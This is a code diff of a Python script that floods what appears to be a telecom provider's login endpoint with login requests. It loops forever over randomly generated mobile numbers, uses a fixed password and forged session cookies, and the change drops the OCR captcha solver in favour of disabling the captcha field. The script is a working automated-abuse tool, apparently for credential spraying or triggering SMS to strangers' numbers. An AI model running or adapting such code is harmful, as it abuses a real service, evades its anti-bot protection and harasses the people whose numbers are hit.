@@ -3,7 +3,7 @@ import random
 import threading
 import time
 
-import ddddocr
+# import ddddocr
 import requests
 
 from utils.output_utils import print_suc, print_inf
@@ -34,7 +34,7 @@ from utils.output_utils import print_suc, print_inf
 # info_bar_xpath = '//*[@id="fastAjaxLoginForm"]/div/div/div[1]/span'
 # submit_btn_xpath = '//*[@id="fastAjaxLoginForm"]/div/div/div[6]/a'
 threads = 0
-d = ddddocr.DdddOcr()
+# d = ddddocr.DdddOcr()
 
 class tel:
 
@@ -76,7 +76,7 @@ class tel:
     #         input_element(tel_input_xpath,'13940273817')# 弄出验证码框
     #         input_element(pwd_input_xpath,'asldlfhawe')
     #         submit_btn.click()
-    JSESSIONID = '7F2A5FB27919F4FA49B71CA69B2F19%s' % generate_random_str(2)
+    JSESSIONID = '7F2A5FB27919F4FA49B71C%s' % generate_random_str(10)
 
     cookie = {'JSESSIONID': JSESSIONID}
 
@@ -124,9 +124,9 @@ class tel:
         data = {
             'agree': 1,
             'autoLoginFlag': 1,
-            'checkImageVCode': 1,
+            'checkImageVCode': 0,
             'accountNo': phone,
-            'imageVCode': self.get_verify_code(),
+            'imageVCode': '',
             'pswd': 'ls82hhd92j',
             'checkbox': 'checkbox',
         }
@@ -167,8 +167,9 @@ if __name__ == '__main__':
     #             threading.Thread(target=tel().doonce, args=('18' + tel().generate_random_str(9),)).start()
     #         except Exception:
     #             pas
-    a = tel()
+
     while True:
+        a = tel()
         try:
             a.doonce('15' + tel().generate_random_str(9))
             a.doonce('13' + tel().generate_random_str(9))
